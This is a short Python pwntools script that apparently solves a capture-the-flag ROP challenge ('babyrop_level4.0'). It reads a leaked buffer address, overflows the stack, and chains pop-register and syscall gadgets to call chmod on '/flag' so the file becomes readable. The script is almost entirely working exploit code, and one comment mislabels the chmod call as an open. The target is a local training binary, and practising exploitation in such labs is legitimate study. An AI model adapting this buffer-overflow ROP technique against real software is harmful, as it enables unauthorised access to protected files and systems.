from pwn import *

context.log_level = 'debug'
offset = b'a' * 64 #72 is offset between buf and ret addr


#push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
pushrax_some = p64(0x401209)

poprax_ret = p64(0x4026db)
poprdi_ret = p64(0x4026bb)
poprsi_ret = p64(0x4026e3)
poprdx_ret = p64(0x4026c3)
syscall    = p64(0x4026eb)


r = process('/challenge/babyrop_level4.0')

r.recvuntil(b'[LEAK] Your input buffer is located at:')
buf = int(r.recvn(15), 16) #also the address of /flag
print(f'Buf: {hex(buf)}')

payload = b'/flag\x00\x00\x00'
payload += offset

#I will open '/flag'
payload += poprax_ret
payload += p64(0x5a)                #chmod syscall
payload += poprdi_ret
payload += p64(buf)                 #pointer string
payload += poprsi_ret
payload += p64(0x4)                 #mode for chmod   
payload += syscall


r.recvuntil(b'\n')
with open("run", 'wb') as file:
    file.write(payload)
r.sendline(payload)

r.interactive()